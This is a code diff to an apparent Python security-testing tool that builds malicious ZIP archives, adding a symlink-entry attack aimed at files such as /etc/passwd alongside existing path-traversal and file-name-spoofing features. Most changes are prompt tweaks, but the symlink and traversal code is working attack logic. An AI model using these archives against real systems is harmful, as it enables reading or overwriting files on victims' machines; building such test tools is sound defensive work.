@@ -17,6 +17,7 @@ def get_traversal_depth():
     else:
         while True:
             depth = input("Enter number of path traversal steps (depth) you would like to test: ").strip()
+            print()
             try:
                 depth = int(depth)
                 break
@@ -31,6 +32,7 @@ def get_file_name():
     else:
         while True:
             file_name = input("Enter file to be saved as a malicious path traversal (e.g. `hello.txt`): ").strip()
+            print()
             
             if InputValidator.is_non_empty_string(file_name) == False:
                 print("File name can't be an empty string.")
@@ -49,11 +51,9 @@ def create_path_traversal(path):
         
     path_traversal_dir += path + get_file_name()
     
-    zip_file = "Archive.zip"
-    
     while True:
-        zip_location = input("If you want to add the file to an existing ZIP, please enter it's location, "
-            "or Press Enter to create a new zip: ").strip()
+        zip_location = input("Enter an existing ZIP file location to work on (Enter to skip and create a new zip): ").strip()
+        print()
         
         if zip_location:
             if os.path.exists(zip_location) and zipfile.is_zipfile(zip_location):
@@ -65,6 +65,7 @@ def create_path_traversal(path):
         else:
             break
     
+    # TODO: Allow the user to choose a different file to contain path traversal (Only if the user gave a zip file)
     with zipfile.ZipFile(zip_file, 'a') as zipf:
         content = "If you see me, this might me a bad sign..."
         temp_file = "tmp.txt"
@@ -84,15 +85,14 @@ def create_spoofed_file(zip_file, filename):
         zipf.writestr(filename, content)
     
 def spoof_file_name():
-    zip_file = "Archive.zip"
     path_to_file = ""
     original_filename = "original_file.txt"
     spoofed_filename =  "spoofed_file_.exe"
     
     # Get/Create ZIP with a file to spoof its name and the spoofed file name to replace the original file name
     while True:
-        zip_location = input("[+] If you have a ZIP containing the file you wish to spoof, please enter it's location, "
-            "or Press Enter to create a new zip: ").strip()
+        zip_location = input("Enter an existing ZIP file location to work on (Enter to skip and create a new zip): ").strip()
+        print()
         
         # If user gave a ZIP he would want to work on
         if zip_location:
@@ -106,6 +106,7 @@ def spoof_file_name():
                     filename_to_spoof = input("[+] Please enter the current name of the file you wish to spoof.\n "
                         "Please provide the full file path inside the zip (including the file extension), "
                         "e.g. `src/components/index.js`:(Press enter to automatically create a spoofable file) ").strip()
+                    print()
                     
                     # If the user provided a file directory to spoof
                     if filename_to_spoof:
@@ -122,7 +123,9 @@ def spoof_file_name():
                                 while True:
                                     spoofed_filename = input(f"Please insert a spoofed file name to replace the original name `{original_filename}` with.\n"
                                         f"!! Notice, the spoofed name should contain exactly {len(original_filename)} characters !!\n").strip()
-
+                                    print()
+                                    
+                                    # Verify spoofed file name is equal to original name
                                     if len(original_filename) != len(spoofed_filename):
                                         print("Original file name and spoofed Filenames lengths must be equal")
                                     
@@ -170,6 +173,56 @@ def spoof_file_name():
         zipf.write(spoofed_data)
     
     print(f"New ZIP file created named {zip_file} with spoofed file name `{spoofed_filename}`, replacing `{original_filename}` file name.")
+
+def create_symlink():
+    # Get/Create ZIP with a file to link the symlink
+    while True:
+        zip_location = input("[+] Enter an existing ZIP file location to work on (Enter to skip and create a new zip): ").strip()
+        
+        # If user gave a ZIP he would want to work on
+        if zip_location:
+            # Verify ZIP location
+            if os.path.exists(zip_location) and zipfile.is_zipfile(zip_location):
+                # Create a copy of the ZIP that the user gave
+                shutil.copy(zip_location, zip_file)
+                
+                print(f"[i] Using existing ZIP '{zip_location}'\n")
+                
+                # Exit loop
+                break
+            
+            # ZIP not found
+            else:
+                # Will start loop again and request valid zip location again
+                print("[!] Invalid location, zip not found.\n")
+        
+        # Create a new ZIP (Will happen later on in the code...)
+        else:
+            print(f"[i] Creating a new ZIP\n")
+
+            # Exit loop
+            break
+    
+    # Get file name to create the symlink with
+    filename_to_symlink = default_config["fns"]["filename_to_symlink"]
+    filename_to_symlink = input("[+]Enter a custom file name (and path) to create the symlink with, e.g. `src/components/symlink.js` || `link_to_passwd`.\n"
+        f"Press Enter to skip and use the default file `{filename_to_symlink}`: ").strip() or filename_to_symlink
+    print(f"[i] Creating a new file `{filename_to_symlink}`\n")
+    
+    # Create a symlink within the ZIP
+    zipInfo = zipfile.ZipInfo(".")
+    zipInfo.create_system = 3
+    zipInfo.external_attr = 2716663808
+    zipInfo.filename = filename_to_symlink
+    
+     # Get file name to create the symlink with
+    symlink_target = default_config["fns"]["symlink_target"]
+    symlink_target = input(f"[+] Enter symlink target, e.g. `/etc/passwd`. Press Enter to skip and use the default file `{symlink_target}`: ").strip() or symlink_target
+    print(f"[i] Creating a symbolic link between `{filename_to_symlink}` to `{symlink_target}`\n")
+    
+    # Create new ZIP/Work on the copy of the given ZIP
+    with zipfile.ZipFile(zip_file, 'a') as zipf:
+        zipf.writestr(zipInfo, symlink_target)
 
 def main():
     global operating_system, default_mode
@@ -227,7 +280,11 @@ def main():
             case "fns":
                 spoof_file_name()
             case "sym":
-                print("Symlink selected")
+                if operating_system == "w":
+                    print("Unfortunately, ZIP symlink attack is not supported for Windows by this tool.\n"
+                          "If you have a Windows script that can help with this, please feel free to open a Pull Request on GitHub.")
+                    exit(1)
+                create_symlink()
             case "dos":
                 print("Denial of Service selected")
             case _:
@@ -238,6 +295,7 @@ def main():
 
 # TODO: Load default settings from config file
 default_config = {
+    "zip_name": "Archive.zip",
     "operating_system": "l",
     "pt": {
         "traversal_depth": 7,
@@ -247,8 +305,14 @@ default_config = {
             "w": "Windows\\",
             "u": "tmp/"
         }
+    },
+    "fns": {
+        "filename_to_symlink": "symlink_by_noam.txt",
+        "symlink_target": "/etc/hosts"
     }
 }
+
+zip_file = default_config["zip_name"]
 
 default_mode = False
         
